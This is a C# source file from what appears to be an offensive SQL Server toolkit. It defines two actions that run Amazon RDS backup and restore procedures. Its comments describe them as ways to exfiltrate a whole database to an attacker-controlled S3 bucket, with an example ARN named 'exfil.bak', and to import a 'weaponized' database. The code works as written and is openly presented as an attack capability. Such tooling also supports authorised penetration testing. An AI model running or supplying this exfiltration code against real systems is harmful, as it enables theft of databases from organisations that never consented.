// MSSQLand/Actions/Cloud/Rds/RdsBackup.cs

using System;
using System.Data;

using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;

namespace MSSQLand.Actions.Cloud.Rds
{
    /// <summary>
    /// Backup an RDS database to S3 via rds_backup_database.
    /// If the IAM role has overly permissive S3 write access, this enables
    /// full database exfiltration to an attacker-controlled bucket.
    /// </summary>
    internal class RdsBackup : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "d", LongName = "db", Required = true, Description = "Database to back up")]
        private string _database = "";

        [ArgumentMetadata(Position = 1, ShortName = "s", LongName = "s3-arn", Required = true, Description = "Target S3 ARN, e.g. arn:aws:s3:::bucket/exfil.bak")]
        private string _s3Arn = "";

        [ArgumentMetadata(ShortName = "t", LongName = "type", Required = false, Description = "Backup type: FULL or DIFFERENTIAL (default: FULL)")]
        private string _type = "FULL";

        [ArgumentMetadata(ShortName = "o", LongName = "overwrite", Required = false, Description = "Overwrite existing S3 object")]
        private bool _overwrite = false;

        [ArgumentMetadata(ShortName = "k", LongName = "kms-key", Required = false, Description = "KMS master key ARN for encryption")]
        private string _kmsKey = "";

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);
            _type = _type.ToUpper();
            if (_type != "FULL" && _type != "DIFFERENTIAL")
            {
                throw new ArgumentException($"Invalid backup type '{_type}'. Use FULL or DIFFERENTIAL.");
            }
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            if (!RdsDetect.RequiresRds(databaseContext))
            {
                return null;
            }

            QueryService qs = databaseContext.QueryService;

            string db = _database.Replace("'", "''");
            string arn = _s3Arn.Replace("'", "''");
            int overwrite = _overwrite ? 1 : 0;

            Logger.Info($"Backing up [{_database}] -> {_s3Arn}");

            string optional = "";
            if (!string.IsNullOrEmpty(_kmsKey))
            {
                string kms = _kmsKey.Replace("'", "''");
                optional = $", @kms_master_key_arn = '{kms}'";
            }

            string query = $"EXEC msdb.dbo.rds_backup_database @source_db_name = '{db}', @s3_arn_to_backup_to = '{arn}', @overwrite_s3_backup_file = {overwrite}, @type = '{_type}'{optional};";

            try
            {
                DataTable dt = qs.ExecuteTable(query);
                if (dt.Rows.Count > 0 && dt.Columns.Contains("task_id"))
                {
                    string taskId = dt.Rows[0]["task_id"]?.ToString();
                    Logger.Success($"Backup task started (task_id: {taskId})");
                    Logger.InfoNested("Monitor with: rds-tasks");
                    return taskId;
                }

                Logger.Warning("No task ID returned");
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Backup failed: {ex.Message}");
                return null;
            }
        }
    }

    /// <summary>
    /// Restore a database from an S3 backup on RDS via rds_restore_database.
    /// Can import a weaponized database or restore a backup exfiltrated from another instance.
    /// </summary>
    internal class RdsRestore : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "d", LongName = "db", Required = true, Description = "Name for the restored database")]
        private string _database = "";

        [ArgumentMetadata(Position = 1, ShortName = "s", LongName = "s3-arn", Required = true, Description = "S3 ARN of the backup file")]
        private string _s3Arn = "";

        [ArgumentMetadata(ShortName = "t", LongName = "type", Required = false, Description = "Restore type: FULL or DIFFERENTIAL (default: FULL)")]
        private string _type = "FULL";

        [ArgumentMetadata(ShortName = "n", LongName = "norecovery", Required = false, Description = "Restore with NORECOVERY (for applying differentials/logs later)")]
        private bool _norecovery = false;

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);
            _type = _type.ToUpper();
            if (_type != "FULL" && _type != "DIFFERENTIAL")
            {
                throw new ArgumentException($"Invalid restore type '{_type}'. Use FULL or DIFFERENTIAL.");
            }
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            if (!RdsDetect.RequiresRds(databaseContext))
            {
                return null;
            }

            QueryService qs = databaseContext.QueryService;

            string db = _database.Replace("'", "''");
            string arn = _s3Arn.Replace("'", "''");
            int norecovery = _norecovery ? 1 : 0;

            Logger.Info($"Restoring {_s3Arn} -> [{_database}]");

            string query = $"EXEC msdb.dbo.rds_restore_database @restore_db_name = '{db}', @s3_arn_to_restore_from = '{arn}', @type = '{_type}', @with_norecovery = {norecovery};";

            try
            {
                DataTable dt = qs.ExecuteTable(query);
                if (dt.Rows.Count > 0 && dt.Columns.Contains("task_id"))
                {
                    string taskId = dt.Rows[0]["task_id"]?.ToString();
                    Logger.Success($"Restore task started (task_id: {taskId})");
                    Logger.InfoNested("Monitor with: rds-tasks");
                    return taskId;
                }

                Logger.Warning("No task ID returned");
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Restore failed: {ex.Message}");
                return null;
            }
        }
    }
}
